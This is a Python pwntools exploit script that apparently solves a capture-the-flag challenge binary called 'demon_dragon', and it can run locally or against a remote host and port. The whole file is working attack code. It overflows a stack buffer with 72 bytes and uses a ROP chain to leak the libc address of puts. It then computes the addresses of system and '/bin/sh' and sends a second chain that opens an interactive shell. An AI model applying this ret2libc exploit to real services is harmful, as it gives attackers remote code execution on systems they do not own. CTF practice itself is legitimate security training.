#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './demon_dragon'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400e43 # pop rdi ; ret

# elf, libc
main = 0x00400D6E
# rop1
offset = 72
payload = 'A'*offset
payload += p64(prdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(main)

ru('Skill > ')
# debug()
sl(payload)
puts = uu64(rc(6))
info_addr('puts',puts)
libc_base = puts - libc.sym['puts']
info_addr('base',libc_base)
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()

# rop2
ru('Skill > ')
payload2 = 'B'*offset
payload2 += p64(prdi) + p64(binsh) + p64(system) + p64(main)
debug()
sl(payload2)
# log.warning('--------------')

p.interactive()

